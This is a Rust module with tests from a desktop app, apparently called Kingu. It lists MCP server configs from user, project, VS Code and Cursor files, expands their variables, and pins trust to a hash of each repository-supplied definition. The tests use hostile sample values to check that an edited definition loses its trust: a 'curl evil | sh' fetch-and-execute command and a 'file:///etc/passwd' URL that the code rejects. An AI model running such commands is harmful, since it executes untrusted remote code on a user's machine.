//! MCP servers from config files (Cursor's and VS Code's MCP management), beside the ones trusted
//! Snaps contribute (the webview's snaps store).
//!
//! Sources, by the key the webview's disabled list (`kingu.mcp.disabled`, `<source>:<name>`) uses:
//!
//! - `user`: Kingu's own `<app config dir>/mcp.json` (`{ "mcpServers": { name: {…} } }`, the
//!   Claude Code / Cursor shape; VS Code's `servers` is read too). The user's own file: no trust
//!   needed. "Add Server…" writes it; the editor opens it as `mcp://user/mcp.json`.
//! - `project`: `.mcp.json` (Claude Code's project file) in the run folder and every folder above
//!   it. Claude Code reads these itself (`settingSources` has `project`), so Kingu never passes
//!   them as servers (that would start them twice): [`run_plan`] tells the SDK which names may
//!   start (`enabledMcpjsonServers`) and which never (`disabledMcpjsonServers`, which wins over
//!   any approval in the user's Claude settings). Without it the SDK would start every one of them.
//! - `vscode` (`.vscode/mcp.json`, `servers`, JSONC) and `cursor` (`.cursor/mcp.json`,
//!   `mcpServers`) of the open folder: read only, passed to runs by the webview like Snap servers.
//!
//! A project, VS Code or Cursor server comes with the repository, so like a repo snap it runs only
//! once the user trusted exactly that definition: the snap trust store, per folder, under the key
//! `.mcp:<source>:<name>` with the hash of the definition as written (before variables are filled
//! in). A changed definition is untrusted again.
//!
//! Variables (VS Code / Cursor / Claude Code): `${workspaceFolder}`, `${workspaceFolderBasename}`,
//! `${userHome}`, `${pathSeparator}`, `${env:NAME}`, and Claude Code's `${NAME}` / `${NAME:-default}`.
//! `${input:…}` (VS Code asks the user) makes the server unusable here.

use std::collections::{BTreeMap, BTreeSet};
use std::path::{Path, PathBuf};

use serde_json::{Map, Value};
use tauri::{AppHandle, State};

use super::host::{McpServer, valid_mcp_name, validate_mcp_server};
use crate::i18n::msg::McpMsg;
use crate::snap::{TRUST_FILE, TrustData, config_dir, set_script_trust, sha256_hex};
use crate::tr;
use crate::workspace::Workspace;

/// Kingu's user MCP config, in the app config dir.
pub const USER_FILE: &str = "mcp.json";
/// Claude Code's project file, read in the run folder and every folder above it.
pub const PROJECT_FILE: &str = ".mcp.json";
pub const VSCODE_FILE: &str = ".vscode/mcp.json";
pub const CURSOR_FILE: &str = ".cursor/mcp.json";
/// The webview's list of turned-off servers (`<source>:<name>`), in the user settings.
pub const DISABLED_SETTING: &str = "kingu.mcp.disabled";
const MAX_FILE_BYTES: u64 = 1024 * 1024;
const USER_TEMPLATE: &str = "{\n  \"mcpServers\": {}\n}\n";

#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Source {
  User,
  Project,
  Vscode,
  Cursor,
}

impl Source {
  pub fn parse(s: &str) -> Result<Self, String> {
    match s {
      "user" => Ok(Self::User),
      "project" => Ok(Self::Project),
      "vscode" => Ok(Self::Vscode),
      "cursor" => Ok(Self::Cursor),
      _ => Err(tr!(McpMsg::SourceInvalid, source = s)),
    }
  }

  fn as_str(self) -> &'static str {
    match self {
      Self::User => "user",
      Self::Project => "project",
      Self::Vscode => "vscode",
      Self::Cursor => "cursor",
    }
  }

  fn trust_key(self, name: &str) -> String {
    format!(".mcp:{}:{name}", self.as_str())
  }

  /// Comes with the repository (so it needs trust).
  fn shared(self) -> bool {
    self != Self::User
  }
}

/// One server definition of a config file, as the MCP Servers view lists it.
#[derive(Debug, Clone, PartialEq, serde::Serialize)]
#[serde(rename_all = "camelCase")]
pub struct McpEntry {
  pub name: String,
  pub source: Source,
  /// The config file (absolute).
  pub file: String,
  /// The file relative to the open folder when it is inside it (the editor opens it), else null.
  pub rel: Option<String>,
  /// With variables filled in; null when the entry cannot be used (`error`).
  pub server: Option<McpServer>,
  /// Of the definition as written: what trusting it pins.
  pub hash: String,
  /// The user's own file always is; others once the user trusted exactly this definition.
  pub trusted: bool,
  pub error: Option<String>,
}

/// What the variables expand to.
pub struct Vars<'a> {
  pub folder: Option<&'a Path>,
  pub home: Option<&'a Path>,
  pub env: &'a dyn Fn(&str) -> Option<String>,
}

/// Fills in `${…}` variables; an `${input:…}` or unknown one is an error naming it.
pub fn expand(name: &str, text: &str, vars: &Vars) -> Result<String, String> {
  let mut out = String::with_capacity(text.len());
  let mut rest = text;
  while let Some(start) = rest.find("${") {
    out.push_str(&rest[..start]);
    let after = &rest[start + 2..];
    let Some(end) = after.find('}') else {
      out.push_str(&rest[start..]);
      return Ok(out);
    };
    let var = &after[..end];
    let whole = format!("${{{var}}}");
    let path = |p: Option<&Path>| p.map(|p| p.display().to_string());
    let value = match var {
      "workspaceFolder" | "workspaceRoot" => path(vars.folder),
      "workspaceFolderBasename" => vars.folder.and_then(|p| p.file_name()).map(|n| n.to_string_lossy().into_owned()),
      "userHome" => path(vars.home),
      "pathSeparator" | "/" => Some("/".into()),
      _ if var.starts_with("input:") => return Err(tr!(McpMsg::NeedsInput, name, var = whole)),
      _ if var.starts_with("env:") => Some((vars.env)(&var[4..]).unwrap_or_default()),
      _ => {
        let (key, default) = match var.split_once(":-") {
          Some((k, d)) => (k, Some(d)),
          None => (var, None),
        };
        let env_name = !key.is_empty() && key.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_') && !key.as_bytes()[0].is_ascii_digit();
        if !env_name {
          return Err(tr!(McpMsg::UnknownVariable, name, var = whole));
        }
        Some((vars.env)(key).or(default.map(str::to_owned)).unwrap_or_default())
      }
    };
    out.push_str(&value.unwrap_or_default());
    rest = &after[end + 1..];
  }
  out.push_str(rest);
  Ok(out)
}

/// JSON with object keys sorted, so a hash does not depend on key order.
fn canonical(v: &Value) -> String {
  match v {
    Value::Object(m) => {
      let mut keys: Vec<&String> = m.keys().collect();
      keys.sort();
      let body: Vec<String> = keys.iter().map(|k| format!("{}:{}", Value::String((*k).clone()), canonical(&m[*k]))).collect();
      format!("{{{}}}", body.join(","))
    }
    Value::Array(a) => format!("[{}]", a.iter().map(canonical).collect::<Vec<_>>().join(",")),
    other => other.to_string(),
  }
}

/// The hash trust pins: the source and the definition as written.
pub fn definition_hash(source: Source, def: &Value) -> String {
  sha256_hex(format!("{}\n{}", source.as_str(), canonical(def)).as_bytes())
}

fn strings(v: Option<&Value>) -> Vec<String> {
  v.and_then(Value::as_array).map(|a| a.iter().filter_map(|x| x.as_str().map(str::to_owned)).collect()).unwrap_or_default()
}

/// String values of an object (numbers and booleans as text, as VS Code takes them; null left out).
fn string_map(v: Option<&Value>) -> BTreeMap<String, String> {
  let Some(m) = v.and_then(Value::as_object) else { return BTreeMap::new() };
  m.iter()
    .filter_map(|(k, v)| match v {
      Value::String(s) => Some((k.clone(), s.clone())),
      Value::Number(_) | Value::Bool(_) => Some((k.clone(), v.to_string())),
      _ => None,
    })
    .collect()
}

/// One definition → a server Kingu can hand to a run (variables filled in, then validated).
pub fn parse_server(name: &str, def: &Value, vars: &Vars) -> Result<McpServer, String> {
  let obj = def.as_object().ok_or_else(|| tr!(McpMsg::NotAnObject, name))?;
  let x = |s: &str| expand(name, s, vars);
  let url = obj.get("url").or_else(|| obj.get("serverUrl")).and_then(Value::as_str);
  // Cursor and older configs leave `type` out of a remote server: a URL makes it one.
  let kind = match obj.get("type").and_then(Value::as_str) {
    Some("streamable-http" | "streamableHttp") => "http".to_owned(),
    Some(k) => k.to_owned(),
    None if url.is_some() && obj.get("command").is_none() => "http".to_owned(),
    None => "stdio".to_owned(),
  };
  let server = match kind.as_str() {
    "stdio" => McpServer {
      kind: None,
      command: x(obj.get("command").and_then(Value::as_str).unwrap_or_default())?,
      args: strings(obj.get("args")).iter().map(|a| x(a)).collect::<Result<_, _>>()?,
      env: string_map(obj.get("env")).into_iter().map(|(k, v)| Ok((k, x(&v)?))).collect::<Result<_, String>>()?,
      ..Default::default()
    },
    "http" | "sse" => McpServer {
      kind: Some(kind.clone()),
      url: Some(x(url.unwrap_or_default())?),
      headers: string_map(obj.get("headers")).into_iter().map(|(k, v)| Ok((k, x(&v)?))).collect::<Result<_, String>>()?,
      ..Default::default()
    },
    other => return Err(tr!(McpMsg::UnsupportedType, name, kind = other)),
  };
  validate_mcp_server(name, &server)?;
  Ok(server)
}

/// The servers object of a parsed config: `mcpServers` (Claude Code, Cursor), else `servers` (VS Code).
fn servers_of(config: &Value) -> Option<&Map<String, Value>> {
  config.get("mcpServers").and_then(Value::as_object).or_else(|| config.get("servers").and_then(Value::as_object))
}

/// Reads one config file: `Ok(None)` when it does not exist.
fn read_config(file: &Path) -> Result<Option<Value>, String> {
  let path = file.display();
  match std::fs::metadata(file) {
    Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
    Err(e) => return Err(tr!(McpMsg::FileUnreadable, path, detail = e)),
    Ok(m) if !m.is_file() => return Ok(None),
    Ok(m) if m.len() > MAX_FILE_BYTES => return Err(tr!(McpMsg::FileUnreadable, path, detail = format!("larger than {MAX_FILE_BYTES} bytes"))),
    Ok(_) => {}
  }
  let text = std::fs::read_to_string(file).map_err(|e| tr!(McpMsg::FileUnreadable, path, detail = e))?;
  if text.trim().is_empty() {
    return Ok(Some(Value::Object(Map::new())));
  }
  serde_json::from_str(&crate::settings::strip_jsonc(&text)).map(Some).map_err(|e| tr!(McpMsg::FileInvalid, path, detail = e))
}

/// The entries of one file; a file that does not parse is one entry carrying the error.
pub fn file_entries(file: &Path, source: Source, root: Option<&Path>, vars: &Vars, trust: &TrustData) -> Vec<McpEntry> {
  let rel = root.and_then(|r| file.strip_prefix(r).ok()).map(|p| p.display().to_string());
  let entry = |name: String, server: Option<McpServer>, hash: String, trusted: bool, error: Option<String>| McpEntry {
    name,
    source,
    file: file.display().to_string(),
    rel: rel.clone(),
    server,
    hash,
    trusted,
    error,
  };
  let config = match read_config(file) {
    Ok(Some(c)) => c,
    Ok(None) => return Vec::new(),
    Err(e) => return vec![entry(String::new(), None, String::new(), false, Some(e))],
  };
  let Some(servers) = servers_of(&config) else { return Vec::new() };
  servers
    .iter()
    .map(|(name, def)| {
      let hash = definition_hash(source, def);
      let trusted = !source.shared() || root.is_some_and(|r| trust.is_trusted(r, &source.trust_key(name), &hash));
      // A project server only has to be a name Claude Code accepts; Kingu passes the others itself.
      let parsed = if source == Source::Project && !name.is_empty() && name.len() <= 200 {
        parse_server(if valid_mcp_name(name) { name } else { "server" }, def, vars)
      } else {
        parse_server(name, def, vars)
      };
      match parsed {
        Ok(s) => entry(name.clone(), Some(s), hash, trusted, None),
        Err(e) => entry(name.clone(), None, hash, trusted, Some(e)),
      }
    })
    .collect()
}

/// `.mcp.json` in `dir` and every folder above it, nearest first.
pub fn project_files(dir: &Path) -> Vec<PathBuf> {
  dir.ancestors().map(|d| d.join(PROJECT_FILE)).filter(|f| f.is_file()).collect()
}

/// Everything the MCP Servers view lists: the user's file, then (with a folder open) its
/// `.mcp.json` files, `.vscode/mcp.json` and `.cursor/mcp.json`.
pub fn list(config_dir: &Path, root: Option<&Path>, home: Option<&Path>, env: &dyn Fn(&str) -> Option<String>, trust: &TrustData) -> Vec<McpEntry> {
  let vars = Vars { folder: root, home, env };
  let mut out = file_entries(&config_dir.join(USER_FILE), Source::User, root, &vars, trust);
  if let Some(root) = root {
    for f in project_files(root) {
      out.extend(file_entries(&f, Source::Project, Some(root), &vars, trust));
    }
    out.extend(file_entries(&root.join(VSCODE_FILE), Source::Vscode, Some(root), &vars, trust));
    out.extend(file_entries(&root.join(CURSOR_FILE), Source::Cursor, Some(root), &vars, trust));
  }
  out
}

/// Which project `.mcp.json` servers a run may start (the SDK's `enabledMcpjsonServers` /
/// `disabledMcpjsonServers`).
#[derive(Debug, Clone, Default, PartialEq, serde::Serialize)]
pub struct ProjectMcp {
  pub enabled: Vec<String>,
  pub disabled: Vec<String>,
}

#[derive(Debug, Clone, Default, PartialEq)]
pub struct RunPlan {
  pub project: Option<ProjectMcp>,
  pub disallowed_tools: Vec<String>,
}

/// A server name as Claude Code puts it in tool names.
pub fn tool_prefix(name: &str) -> String {
  let clean: String = name.chars().map(|c| if c.is_ascii_alphanumeric() || c == '_' || c == '-' { c } else { '_' }).collect();
  format!("mcp__{clean}")
}

/// For a run in `dir` of the open folder `root`: a `.mcp.json` name starts only when every
/// definition of it (in `dir` and above) is trusted, the user did not turn it off, and Kingu does
/// not pass a server of that name itself (`passed`). Servers the user turned off that the run would
/// still get (from their own Claude settings, `<source>` `claude`) lose their tools.
pub fn run_plan(root: &Path, dir: &Path, passed: &BTreeSet<String>, disabled: &BTreeSet<String>, trust: &TrustData) -> RunPlan {
  let mut verdict: BTreeMap<String, bool> = BTreeMap::new();
  for file in project_files(dir) {
    let Ok(Some(config)) = read_config(&file) else { continue };
    let Some(servers) = servers_of(&config) else { continue };
    for (name, def) in servers {
      if name.is_empty() || name.len() > 200 {
        continue;
      }
      let ok = trust.is_trusted(root, &Source::Project.trust_key(name), &definition_hash(Source::Project, def)) && !disabled.contains(&format!("project:{name}")) && !passed.contains(name);
      let v = verdict.entry(name.clone()).or_insert(true);
      *v = *v && ok;
    }
  }
  let project = (!verdict.is_empty()).then(|| ProjectMcp {
    enabled: verdict.iter().filter(|(_, ok)| **ok).map(|(n, _)| n.clone()).collect(),
    disabled: verdict.iter().filter(|(_, ok)| !**ok).map(|(n, _)| n.clone()).collect(),
  });
  let enabled: BTreeSet<&String> = project.iter().flat_map(|p| &p.enabled).collect();
  let disallowed_tools = disabled
    .iter()
    .filter_map(|id| id.split_once(':').map(|(_, name)| name))
    .filter(|name| !name.is_empty() && !passed.contains(*name) && !enabled.contains(&name.to_string()))
    .map(tool_prefix)
    .collect::<BTreeSet<_>>()
    .into_iter()
    .take(200)
    .collect();
  RunPlan { project, disallowed_tools }
}

/// The user's turned-off servers from their settings.json.
pub fn disabled_ids(config_dir: &Path) -> BTreeSet<String> {
  crate::settings::user_value(config_dir, DISABLED_SETTING)
    .and_then(|v| v.as_array().cloned())
    .map(|a| a.into_iter().filter_map(|x| x.as_str().map(str::to_owned)).filter(|s| s.len() <= 256).take(500).collect())
    .unwrap_or_default()
}

/// Adds `name` to the user's file (keeping what else it has); refuses a name it already has.
pub fn add_user_server(file: &Path, name: &str, server: &McpServer) -> Result<(), String> {
  validate_mcp_server(name, server)?;
  let mut config = match read_config(file)? {
    Some(Value::Object(m)) => m,
    Some(_) => return Err(tr!(McpMsg::FileInvalid, path = file.display(), detail = "not an object")),
    None => Map::new(),
  };
  let key = if config.contains_key("mcpServers") || !config.contains_key("servers") { "mcpServers" } else { "servers" };
  let servers = config.entry(key).or_insert_with(|| Value::Object(Map::new()));
  let Some(servers) = servers.as_object_mut() else {
    return Err(tr!(McpMsg::FileInvalid, path = file.display(), detail = format!("{key} is not an object")));
  };
  if servers.contains_key(name) {
    return Err(tr!(McpMsg::AlreadyExists, name));
  }
  servers.insert(name.to_owned(), serde_json::to_value(server).map_err(|e| e.to_string())?);
  let text = serde_json::to_string_pretty(&Value::Object(config)).map_err(|e| e.to_string())?;
  crate::settings::write_atomic(file, &format!("{text}\n"))
}

/// Removes `name` from the user's file.
pub fn remove_user_server(file: &Path, name: &str) -> Result<(), String> {
  let not_found = || tr!(McpMsg::NotFound, name, path = file.display());
  let Some(Value::Object(mut config)) = read_config(file)? else { return Err(not_found()) };
  let removed = ["mcpServers", "servers"].iter().any(|k| config.get_mut(*k).and_then(Value::as_object_mut).is_some_and(|m| m.remove(name).is_some()));
  if !removed {
    return Err(not_found());
  }
  let text = serde_json::to_string_pretty(&Value::Object(config)).map_err(|e| e.to_string())?;
  crate::settings::write_atomic(file, &format!("{text}\n"))
}

fn home() -> Option<PathBuf> {
  std::env::var_os("HOME").map(PathBuf::from)
}

fn load_trust(config: &Path) -> TrustData {
  TrustData::load(&config.join(TRUST_FILE))
}

#[tauri::command]
pub async fn mcp_list(app: AppHandle, ws: State<'_, Workspace>) -> Result<Vec<McpEntry>, String> {
  let root = ws.current();
  tauri::async_runtime::spawn_blocking(move || {
    let config = config_dir(&app)?;
    let home = home();
    Ok(list(&config, root.as_deref(), home.as_deref(), &|k| std::env::var(k).ok(), &load_trust(&config)))
  })
  .await
  .map_err(|e| e.to_string())?
}

/// Trusts (with the `hash` the user was shown) or untrusts a server of the open folder's config.
#[tauri::command]
pub fn mcp_trust(app: AppHandle, ws: State<'_, Workspace>, source: String, name: String, hash: Option<String>) -> Result<(), String> {
  let source = Source::parse(&source)?;
  if !source.shared() {
    return Err(tr!(McpMsg::SourceInvalid, source = source.as_str()));
  }
  let root = ws.root().map_err(|_| tr!(McpMsg::NoFolder))?;
  let config = config_dir(&app)?;
  let key = source.trust_key(&name);
  let Some(expected) = hash else {
    log::info!("mcp {key}: untrusted in {}", root.display());
    return set_script_trust(&config, &root, &key, None);
  };
  let home = home();
  let entries = list(&config, Some(&root), home.as_deref(), &|k| std::env::var(k).ok(), &load_trust(&config));
  let mine: Vec<&McpEntry> = entries.iter().filter(|e| e.source == source && e.name == name).collect();
  let Some(first) = mine.first() else {
    return Err(tr!(McpMsg::NotFound, name, path = source.as_str()));
  };
  if !mine.iter().any(|e| e.hash == expected) {
    return Err(tr!(McpMsg::Changed, name, path = first.file));
  }
  log::info!("mcp {key}: trusted in {}", root.display());
  set_script_trust(&config, &root, &key, Some(&expected))
}

/// The user's mcp.json, read for the editor (`mcp://user/mcp.json`); a template when it does not exist.
#[tauri::command]
pub fn mcp_user_read(app: AppHandle) -> Result<String, String> {
  let file = config_dir(&app)?.join(USER_FILE);
  match crate::settings::read(&file)? {
    Some(text) => Ok(text),
    None => Ok(USER_TEMPLATE.to_owned()),
  }
}

#[tauri::command]
pub fn mcp_user_write(app: AppHandle, content: String) -> Result<(), String> {
  crate::settings::write_atomic(&config_dir(&app)?.join(USER_FILE), &content)
}

#[tauri::command]
pub fn mcp_add_server(app: AppHandle, name: String, server: McpServer) -> Result<(), String> {
  add_user_server(&config_dir(&app)?.join(USER_FILE), &name, &server)?;
  log::info!("mcp {name}: added to the user mcp.json");
  Ok(())
}

#[tauri::command]
pub fn mcp_remove_server(app: AppHandle, name: String) -> Result<(), String> {
  remove_user_server(&config_dir(&app)?.join(USER_FILE), &name)?;
  log::info!("mcp {name}: removed from the user mcp.json");
  Ok(())
}

#[cfg(test)]
mod tests {
  use super::*;
  use serde_json::json;

  fn no_env(_: &str) -> Option<String> {
    None
  }

  fn vars<'a>(folder: &'a Path, env: &'a dyn Fn(&str) -> Option<String>) -> Vars<'a> {
    Vars { folder: Some(folder), home: Some(Path::new("/home/u")), env }
  }

  #[test]
  fn expands_vscode_cursor_and_claude_variables() {
    let env = |k: &str| (k == "TOKEN").then(|| "t0k".to_owned());
    let v = vars(Path::new("/w/app"), &env);
    assert_eq!(expand("s", "${workspaceFolder}/bin:${userHome}${pathSeparator}x", &v).unwrap(), "/w/app/bin:/home/u/x");
    assert_eq!(expand("s", "${workspaceFolderBasename} ${env:TOKEN} ${TOKEN} ${MISSING:-def} ${MISSING}.", &v).unwrap(), "app t0k t0k def .");
    assert!(expand("s", "${input:apiKey}", &v).unwrap_err().contains("${input:apiKey}"));
    assert!(expand("s", "${command:pick}", &v).unwrap_err().contains("${command:pick}"));
    assert_eq!(expand("s", "no vars, ${unterminated", &v).unwrap(), "no vars, ${unterminated");
  }

  #[test]
  fn parses_stdio_and_remote_servers_of_each_format() {
    let v = vars(Path::new("/w"), &no_env);
    let stdio = parse_server("fs", &json!({"command": "npx", "args": ["-y", "server-fs", "${workspaceFolder}"], "env": {"N": 1, "Z": null}}), &v).unwrap();
    assert_eq!((stdio.kind, stdio.command.as_str(), stdio.args.last().unwrap().as_str()), (None, "npx", "/w"));
    assert_eq!(stdio.env, BTreeMap::from([("N".into(), "1".into())]));
    // Cursor: a URL without a type is remote (http); VS Code's types; Claude's sse.
    let cursor = parse_server("docs", &json!({"url": "https://mcp.example.com/mcp", "headers": {"Authorization": "Bearer x"}}), &v).unwrap();
    assert_eq!((cursor.kind.as_deref(), cursor.url.as_deref()), (Some("http"), Some("https://mcp.example.com/mcp")));
    assert_eq!(parse_server("live", &json!({"type": "sse", "url": "http://localhost:1/sse"}), &v).unwrap().kind.as_deref(), Some("sse"));
    assert!(parse_server("bad", &json!({"type": "ws", "url": "wss://x"}), &v).is_err());
    assert!(parse_server("bad", &json!({"type": "http", "url": "file:///etc/passwd"}), &v).is_err());
    assert!(parse_server("bad", &json!({"args": ["x"]}), &v).is_err());
    assert!(parse_server("bad", &json!("npx"), &v).is_err());
    assert!(parse_server("bad name", &json!({"command": "x"}), &v).is_err());
  }

  #[test]
  fn hashes_ignore_key_order_but_not_content_or_source() {
    let a = json!({"command": "x", "args": ["1"]});
    let b: Value = serde_json::from_str(r#"{"args": ["1"], "command": "x"}"#).unwrap();
    assert_eq!(definition_hash(Source::Project, &a), definition_hash(Source::Project, &b));
    assert_ne!(definition_hash(Source::Project, &a), definition_hash(Source::Cursor, &a));
    assert_ne!(definition_hash(Source::Project, &a), definition_hash(Source::Project, &json!({"command": "x", "args": ["2"]})));
  }

  #[test]
  fn lists_every_source_and_trusts_only_pinned_definitions() {
    let tmp = tempfile::tempdir().unwrap();
    let (config, root) = (tmp.path().join("config"), tmp.path().join("repo"));
    std::fs::create_dir_all(root.join(".vscode")).unwrap();
    std::fs::create_dir_all(root.join(".cursor")).unwrap();
    std::fs::create_dir_all(&config).unwrap();
    std::fs::write(config.join(USER_FILE), r#"{"mcpServers": {"gh": {"command": "gh-mcp"}}}"#).unwrap();
    std::fs::write(root.join(PROJECT_FILE), r#"{"mcpServers": {"db": {"command": "psql-mcp"}}}"#).unwrap();
    std::fs::write(root.join(VSCODE_FILE), "{\n // VS Code allows comments\n \"servers\": {\"docs\": {\"type\": \"http\", \"url\": \"https://d.dev/mcp\"},},\n \"inputs\": []\n}").unwrap();
    std::fs::write(root.join(CURSOR_FILE), r#"{"mcpServers": {"key": {"command": "x", "env": {"K": "${input:key}"}}}}"#).unwrap();
    let mut trust = TrustData::default();
    let db_hash = definition_hash(Source::Project, &json!({"command": "psql-mcp"}));
    trust.set(&root, ".mcp:project:db", Some(&db_hash));
    let all = list(&config, Some(&root), None, &no_env, &trust);
    let by = |n: &str| all.iter().find(|e| e.name == n).unwrap();
    assert_eq!((by("gh").source, by("gh").trusted, by("gh").rel.as_deref()), (Source::User, true, None));
    assert_eq!((by("db").source, by("db").trusted, by("db").rel.as_deref()), (Source::Project, true, Some(PROJECT_FILE)));
    assert_eq!((by("docs").source, by("docs").trusted), (Source::Vscode, false));
    assert!(by("docs").server.as_ref().is_some_and(|s| s.kind.as_deref() == Some("http")));
    assert!(by("key").error.as_ref().is_some_and(|e| e.contains("${input:key}")) && by("key").server.is_none());
    // An edited definition is no longer the trusted one.
    std::fs::write(root.join(PROJECT_FILE), r#"{"mcpServers": {"db": {"command": "curl evil | sh"}}}"#).unwrap();
    assert!(!list(&config, Some(&root), None, &no_env, &trust).iter().any(|e| e.name == "db" && e.trusted));
    // A broken file is one entry with the error.
    std::fs::write(root.join(CURSOR_FILE), "{nope").unwrap();
    assert!(list(&config, Some(&root), None, &no_env, &trust).iter().any(|e| e.source == Source::Cursor && e.error.is_some()));
  }

  #[test]
  fn run_plan_starts_only_trusted_enabled_project_servers() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path().join("repo");
    let wt = root.join(".kingu/worktrees/a");
    std::fs::create_dir_all(&wt).unwrap();
    std::fs::write(root.join(PROJECT_FILE), r#"{"mcpServers": {"db": {"command": "db"}, "web": {"command": "web"}, "off": {"command": "off"}, "mine": {"command": "m"}}}"#).unwrap();
    // The worktree's own copy: its "db" differs from the trusted one.
    std::fs::write(wt.join(PROJECT_FILE), r#"{"mcpServers": {"db": {"command": "db --evil"}}}"#).unwrap();
    let mut trust = TrustData::default();
    for (n, c) in [("db", "db"), ("off", "off"), ("mine", "m")] {
      trust.set(&root, &format!(".mcp:project:{n}"), Some(&definition_hash(Source::Project, &json!({"command": c}))));
    }
    let passed = BTreeSet::from(["mine".to_string()]);
    let disabled = BTreeSet::from(["project:off".to_string(), "claude:gh.com".to_string(), "user:mine".to_string()]);
    let plan = run_plan(&root, &root, &passed, &disabled, &trust);
    assert_eq!(plan.project, Some(ProjectMcp { enabled: vec!["db".into()], disabled: vec!["mine".into(), "off".into(), "web".into()] }));
    // Turned-off servers lose their tools, except a name Kingu passes itself.
    assert_eq!(plan.disallowed_tools, vec!["mcp__gh_com".to_string(), "mcp__off".to_string()]);
    let in_worktree = run_plan(&root, &wt, &passed, &BTreeSet::new(), &trust);
    assert!(in_worktree.project.unwrap().disabled.contains(&"db".to_string()));
    assert_eq!(run_plan(&root, tmp.path(), &BTreeSet::new(), &BTreeSet::new(), &trust), RunPlan::default());
  }

  #[test]
  fn adds_and_removes_servers_in_the_user_file() {
    let tmp = tempfile::tempdir().unwrap();
    let file = tmp.path().join(USER_FILE);
    std::fs::write(&file, r#"{"other": 1, "mcpServers": {"a": {"command": "a"}}}"#).unwrap();
    let http = McpServer { kind: Some("http".into()), url: Some("https://x.dev/mcp".into()), ..Default::default() };
    add_user_server(&file, "docs", &http).unwrap();
    assert!(add_user_server(&file, "docs", &http).unwrap_err().contains("docs"));
    assert!(add_user_server(&file, "bad", &McpServer { kind: Some("http".into()), url: Some("ftp://x".into()), ..Default::default() }).is_err());
    let v: Value = serde_json::from_str(&std::fs::read_to_string(&file).unwrap()).unwrap();
    assert_eq!(v["other"], 1);
    assert_eq!(v["mcpServers"]["docs"], json!({"type": "http", "url": "https://x.dev/mcp"}));
    remove_user_server(&file, "a").unwrap();
    assert!(remove_user_server(&file, "a").is_err());
    let fresh = tmp.path().join("new/mcp.json");
    add_user_server(&fresh, "s", &McpServer { command: "srv".into(), ..Default::default() }).unwrap();
    assert!(std::fs::read_to_string(&fresh).unwrap().contains("\"mcpServers\""));
  }
}
